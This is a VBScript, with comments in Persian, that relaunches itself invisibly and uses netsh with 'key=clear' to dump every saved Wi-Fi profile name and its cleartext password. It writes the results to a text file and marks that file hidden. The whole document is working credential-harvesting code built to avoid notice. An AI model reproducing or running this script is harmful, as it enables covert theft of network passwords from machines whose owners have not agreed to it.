' اجرای اسکریپت به صورت مخفی
If Not WScript.Arguments.Named.Exists("runHidden") Then
    CreateObject("WScript.Shell").Run """" & WScript.ScriptFullName & """ /runHidden", 0, False
    WScript.Quit
End If

' تعریف فایل خروجی
Dim objFSO, objFile, objShell, objExec, profileName, password
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
Set WshShell = CreateObject("WScript.Shell")

' ایجاد فایل خروجی
Dim outputFile
outputFile = "wifi_profiles.txt"
Set objFile = objFSO.CreateTextFile(outputFile, True)

' نوشتن عنوان‌ها در فایل خروجی
objFile.WriteLine "Retrieving WiFi profiles..."
objFile.WriteLine "-----------------------------------------"
objFile.WriteLine "SSID                Password"
objFile.WriteLine "-----------------------------------------"

' اجرای دستور برای لیست کردن پروفایل‌های WiFi به صورت مخفی و بی‌صدا
Set objExec = objShell.Exec("netsh wlan show profiles")

Do While Not objExec.StdOut.AtEndOfStream
    line = objExec.StdOut.ReadLine
    If InStr(line, ":") > 0 Then
        If InStr(line, "All User Profile") > 0 Then
            ' استخراج نام پروفایل
            profileName = Trim(Mid(line, InStr(line, ":") + 1))
            
            ' دریافت رمز عبور پروفایل
            password = GetWiFiPassword(profileName)
            
            ' ذخیره نام پروفایل و رمز عبور در فایل خروجی
            If password = "" Then
                objFile.WriteLine profileName & "            (No Password)"
            Else
                objFile.WriteLine profileName & "            " & password
            End If
        End If
    End If
Loop

objFile.WriteLine "-----------------------------------------"
objFile.Close

' اعمال ویژگی پنهان به فایل خروجی
Set objFile = objFSO.GetFile(outputFile)
objFile.Attributes = objFile.Attributes Or 2 ' مقدار 2 نشان‌دهنده ویژگی Hidden است

' تابع برای دریافت رمز عبور WiFi
Function GetWiFiPassword(profileName)
    Dim objExecPass, linePass
    Set objExecPass = objShell.Exec("netsh wlan show profile """ & profileName & """ key=clear")
    GetWiFiPassword = ""
    
    Do While Not objExecPass.StdOut.AtEndOfStream
        linePass = objExecPass.StdOut.ReadLine
        If InStr(linePass, "Key Content") > 0 Then
            GetWiFiPassword = Trim(Mid(linePass, InStr(linePass, ":") + 1))
            Exit Do
        End If
    Loop
End Function
